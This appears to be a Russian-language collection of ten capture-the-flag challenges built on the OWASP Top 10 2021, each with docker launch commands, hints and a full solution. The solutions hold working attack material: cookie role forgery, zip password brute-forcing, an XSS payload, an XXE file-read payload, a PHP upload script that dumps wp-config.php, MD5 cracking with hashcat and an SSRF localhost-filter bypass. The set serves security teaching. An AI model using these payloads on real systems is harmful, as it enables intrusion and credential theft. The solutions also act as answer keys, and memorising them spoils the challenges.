1. Broken Access Control
Описание: Я нашел интересный сайт, но никак не могу найти то, что мне нужно. Возможно нужно спросить у админа?
Запуск: docker run -d -p 1000:1000 bac_rate 

localhost:1000

Подсказка 1:
Обратите внимание на информацию, хранящуюся в куки после регистрации.
Подсказка 2:
Попробуйте изменить содержимое куки, чтобы увидеть, что произойдет.

Решение: 
1) Зарегистрируйтесь на сайте и обратите внимание, что роль пользователя хранится в куки в виде base64.
2) Зашифруйте "admin" в base64 с помощью онлайн base64-encoder и вставьте его в куки: role = YWRtaW4= (role = admin). 
3) Обновите страницу и получите флаг для администратора.

2. A02:2021-Cryptographic Failures
Описание: Мы нашли на сайте секретный архив secret.zip, защищенный паролем! Помоги нам узнать секреты которые скрывает от нас компания...
Запуск: secret.zip

Подсказка 1:
Возможно, пароль для архива не очень длинный. От 4 до 6 символов
Подсказка 2: Пароль состоит из букв нижнего регистра.

Решение: 
Брутфорс пароля с помощью fcrackzip или john:
fcrackzip -v -u -b -c 'a' -l 4-6 secret.zip
		или
zip2john secret.zip > hash.txt
john --format=PKZIP --incremental=Alpha hash.txt

3. A03:2021-Injection   
Описание: Сайт, который поздравляет тебя с днем рождения, это круто, но еще круче сайт с XSS
Запуск: docker run -p 2000:2000 xsss

localhost:2000

Подсказка 1: 
Используйте XSS.
Подсказка 2: 
Используйте URL encoding.

Решение: 
1) Закодируйте свой XSS-код в URL-кодировании, используя онлайн-сервис.
2) Вставьте закодированный текст в поле ввода на сайте.
Пример: %3Cscript%3Ealert%28%221%22%29%3C%2Fscript%3E

4. A04:2021-Insecure Design 
Описание: Красивая страница авторизации, может быть не такой безопасной...
Запуск: docker run -p 80:80 insecure_design

localhost:80

Подсказка 1: 
Посмотрите на исходный код страницы.
Подсказка 2: 
Ищите что-то необычное или скрытое в коде страницы.

Решение: Посмотрите исходный код страницы и найдите в нем флаг.

5. A05:2021-Security Misconfiguration 
Запуск: docker run -d -p 4000:4000 sec_misconfig

localhost:4000

Подсказка 1:
Обратите внимание на возможности загрузки файлов на сайт.
Подсказка 2:
Попробуйте отправить файл, содержащий специфическую XML структуру, чтобы открыть файл "file:///flag".

Решение: 
1) Создайте файл solution.xml:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<root>
    <firstname>John</firstname>
    <phonenumber>1234567890</phonenumber>
    <emailadd>&xxe;</emailadd>
</root>
2) Отправьте файл POST-запросом:
$curl -X POST -d @solution.xml http://localhost:8080/xxe.php --header "Content-Type: text/xml"

6. A06:2021-Vulnerable and Outdated Components
Описание: Джон постоянно твердит всем, что он такой хороший fullstack сисадмин devop, но вы преподадите ему урок. Пристыдите его, узнав пароль к базе данных сайта.
admin user credentials are NJDZgw$K0lR0bK9R%*
Запуск: sudo docker-compose up --build

localhost:30100

Подсказка 1:
Изучите известные пути, связанные с WordPress установками.
Подсказка 2:
Ищите возможность загрузки файлов на сайт.

Решение:
1) Проверьте наличие каталога /wp-content/plugins, который часто содержит уязвимые плагины в WordPress.
2) Найдите файл upload.html, позволяющий загружать файлы без ограничений.
3) Загрузите PHP-скрипт, который читает файл wp-config.php и извлекает переменную DB_PASSWORD.
Пример скрипта:
<?php
echo file_get_contents(«.../.../wp-config.php»);
?>
4) Затем зайдите в загруженный файл, что-то вроде /uploads/hiden_<random_id1>/<random_id2>.php и просмотрите исходный код страницы.

7. A07:2021-Identification and Authentication Failures 
Описание: Ты агент под прикрытием, работающий на секретную организацию. Твоя миссия: взломать систему аутентификации и получить доступ к тайным данным. Но будь осторожен, система охраняется опытными программистами, которые считают, что их защита непробиваема, а код идеален...
Запуск: docker run -p 5000:5000 ctf-auth-failure

localhost:5000

Подсказка 1:
Поищите исходный код системы аутентификации.
Подсказка 2:
Найдите хэш пароля и попытайтесь его расшифровать.

Решение: 
1) Перейдите в директорию /source и найдите хэш пароля администратора.
2) Расшифруйте хэш и используйте полученный пароль для входа в систему:
echo "5ebe2294ecd0e0f08eab7690d2a6ee69" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
Пароль - secret

8. A08:2021-Software and Data Integrity Failures
Описание: В вашем распоряжении оказалась информация о том, что таинственная организация "Data Keepers" разработала систему, которая позволяет проверять целостность загружаемых файлов. Ваша задача - проникнуть в эту систему, обойти её механизмы защиты и получить секретный флаг.
Запуск: docker-compose up -d --build

localhost:6000

Подсказка 1:
Внимательно изучите главную страницу и страницу загрузки файлов.
Подсказка 2:
Обратите внимание на использование MD5 хэшей.

Решение: 
1) Откройте главную страницу CTF челленджа.
2) Перейдите на страницу загрузки файлов.
3) Обратите внимание на подсказку и найдите MD5 хэш.
4) Создайте файл solution.txt с содержимым "hello".

import hashlib

hash_object = hashlib.md5(b'hello')
print(hash_object.hexdigest())

echo -n "hello" > solution.txt

5) Загрузите файл на сервер.

9. A09:2021-Security Logging and Monitoring Failures
Описание: Вы — член элитной команды хакеров, известной своими успешными взломами и исследованиями уязвимостей. Недавно ваша команда получила доступ к сети крупной корпорации, известной своими высокими стандартами безопасности. Однако, проникнув в их защищенную среду, вы обнаружили серьезные проблемы с мониторингом и логированием безопасности.
Запуск: docker run -p 7000:7000 logging

localhost:7000

Подсказка 1:
Изучите доступные директории с логами.
Подсказка 2:
Попробуйте найти логин и пароль администратора в логах.
Решение: 
1) Найдите директорию /logs и просмотрите ее содержимое.
2) В логах можно обнаружить логин и пароль администратора, а также запись о создании файла flag.txt в секретной директории (/secret_logs).
3) Войдите в систему с учетными данными администратора и перейдите в секретную директорию.
4) Найдите файл flag.txt и декодируйте его содержимое (если оно закодировано в base64).
5) Декодируем флаг используя любой онлайн base64-decoder.

10. A10:2021-Server-Side Request Forgery 
Описание: Вы член группы хакеров, известной своими уникальными методами взлома. Ваша следующая цель — использовать уязвимость Server-Side Request Forgery (SSRF) для доступа к защищенному флагу, который находится на внутреннем сервере.
RUN: docker run -p 9000:9000 ssrf

localhost:9000

Подсказка 1:
Попробуйте различные способы представления IP адресов для обхода фильтров.
Подсказка 2:
Используйте известные трюки для обхода фильтрации локальных адресов. Порт - 1729

Подсказка в самом задании относится к "Такси Харди" - знаменитому математическому анекдоту, связанному с числом 1729.

Решение:
1) Веб-приложение фильтрует запросы к локальным адресам и известным форматам, таким как localhost, 127.0.0.1, 0.0.0.0 и их эквивалентам в различных форматах.
2) Используйте различные способы представления IP-адресов (127.0.0.1, 0.0.0.0, 2130706433, 0x7f000001 и т.д.) для обхода фильтров.
Пример:
curl -X POST -d 'url=http://2130706433:1729/' http://localhost:2000/proxy



